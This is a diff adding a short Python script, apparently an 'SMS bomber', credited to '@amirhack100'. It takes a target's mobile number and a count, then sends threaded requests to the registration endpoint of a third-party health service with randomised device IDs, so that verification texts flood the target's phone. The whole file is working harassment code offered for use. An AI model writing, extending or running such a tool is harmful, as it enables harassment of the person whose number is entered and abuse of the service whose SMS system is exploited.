@@ -1,0 +1,18 @@
+from requests import *
+from threading import Thread
+import random
+print("@amirhack100")
+phone = input("Phone Number With 0912******* --> ")
+amount = int(input("Tedad Attack --> "))
+def hesla(phone):
+    get(f"http://api.helsa.co/api/User/GetRegisterCode?mobileNumber={phone}&deviceId=25010064645373610205{str(random.randint(10,99))}5635373610201245305760136624&discountCode=&utm_content=&utm_source=&utm_campain=")
+sended = 0
+while True:
+    Thread(target=hesla, args=[phone]).start()
+    sended +=1
+    print("sended "+ str(sended)+" requests !", end="\r")
+    
+    if sended == amount:
+        print(f"SuCceSsfuLy Sended {str(amount)} sMs !")
+        exit()
+    
